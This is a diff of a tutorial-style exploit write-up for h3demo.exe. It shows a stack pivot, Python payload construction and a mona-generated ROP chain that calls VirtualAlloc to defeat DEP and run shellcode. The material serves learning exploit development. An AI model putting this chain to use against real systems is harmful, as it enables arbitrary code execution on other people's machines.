@@ -130,7 +130,7 @@ To ease testing I've rewriten the orginal exploit to python3 as it is way easier
 
 At this point we have full control over EIP.
 
-## Stack pivot
+## EIP to ROP
 We do control the EIP, but the question was, what's next? We cannot just jump to our shellcode located on the stack as ASLR and DEP are both enabled. But we could try to create a ROP chain as we control the stack. But we have to increase the esp to point to our payload. Let's examine registers when execution is passed to us:
 
 ![](img/registers.png)
@@ -182,10 +182,80 @@ Non-SafeSEH protected pivots :
 [...]
 ```
 
-## 
+I've chosen gadget at address `0x0054a7e3` for no reason. It pivots the stack by 1816 bytes, so after the pivot, the esp will point to: 0x19c580. This is 88 (0x19c580 - 0x0019C528) bytes after the overwriten handler. This means our payload will look like:
 
+```python3
+pivot = pack('<L', PIVOT_1816_GADGET)
+pivot  += (1816 - 1732) * b'A'
+
+# Then trigger ROP chain
+rop = create_rop_chain()
+
+# Construct a malicious object entry with a big size.
+payload_size = SEH_HANDLER_OFST + len(pivot) + len(rop)
+payload = pack('<L', payload_size)
+payload += b'\x00' * 2 + b'A' * (SEH_HANDLER_OFST - 6)
+payload += pivot
+payload += rop
+```
+
+## ROP to shellcode
+Right now we can execute ROP of our choice. In fact this is enought to do anything we would like. But I really wanted to gain ability to execute shellcode of my choice. This would allow me to easly test shellcodes I find on internet.
 
 There are standard ways to bypass DEP on windows. Windows API provides few useful functions for this: `VirtualProtect`, `VirtualAlloc`, `SetInformationProcess`, `SetProcessDEPPolicy`.
 
 Looking through `IAT` import api table (elf's `plt` table) in IDA I've found the `VirtualAlloc`.
+
+Moreover we can use `mona` again! It will find correct gadgets for us and even parse them to python code! At first I was confused that it places all arguments in registers as WinAPI uses `__stdcall` calling convention, but if you look closely, the last gadget is `pushad` instruction which will push all registers onto the stack.
+You can find the ropchains in `rop_chain.txt` file generated before.
+
+
+```python3
+def create_rop_chain():
+    '''Register setup for VirtualAlloc() :
+        --------------------------------------------
+        EAX = NOP (0x90909090)
+        ECX = flProtect (0x40)
+        EDX = flAllocationType (0x1000)
+        EBX = dwSize
+        ESP = lpAddress (automatic)
+        EBP = ReturnTo (ptr to jmp esp)
+        ESI = ptr to VirtualAlloc()
+        EDI = ROP NOP (RETN) '''
+    # rop chain generated with mona.py - www.corelan.be
+    rop_gadgets = [
+        #[---INFO:gadgets_to_set_esi:---]
+        0x005a6a80,  # POP EAX # RETN [h3demo.exe] 
+        0x41414141,  # Added manually, as stack_pivot ends with ret 4
+        0x005b4068,  # ptr to &VirtualAlloc() [IAT h3demo.exe]
+        0x005a2d01,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [h3demo.exe] 
+        0x0056ce54,  # XCHG EAX,ESI # RETN [h3demo.exe] 
+        #[---INFO:gadgets_to_set_ebp:---]
+        0x005a7b1b,  # POP EBP # RETN [h3demo.exe] 
+        0x004d1f4d,  # & call esp [h3demo.exe]
+        #[---INFO:gadgets_to_set_ebx:---]
+        0x0054646d,  # POP EBX # RETN [h3demo.exe] 
+        0x00000001,  # 0x00000001-> ebx
+        #[---INFO:gadgets_to_set_edx:---]
+        0x005a0ae0,  # POP EDX # RETN [h3demo.exe] 
+        0x00001000,  # 0x00001000-> edx
+        #[---INFO:gadgets_to_set_ecx:---]
+        0x005aa177,  # POP ECX # RETN [h3demo.exe] 
+        0x00000040,  # 0x00000040-> ecx
+        #[---INFO:gadgets_to_set_edi:---]
+        0x0053b8e2,  # POP EDI # RETN [h3demo.exe] 
+        0x0050c542,  # RETN (ROP NOP) [h3demo.exe]
+        #[---INFO:gadgets_to_set_eax:---]
+        0x005a0574,  # POP EAX # RETN [h3demo.exe] 
+        0x90909090,  # nop
+        #[---INFO:pushad:---]
+        0x0059c334,  # PUSHAD # RETN [h3demo.exe] 
+    ]
+    return b''.join(pack('<I', _) for _ in rop_gadgets)
+```
+
+As you can see, I've added manually the 0x41414141 junk as stack pivot ends with `retn 4` which pops 4 bytes from the stack. Other then that this ROP will add the executable flag to stack's memory and jump to the code on the stack after the ROP.
+This is great!
+
+
 
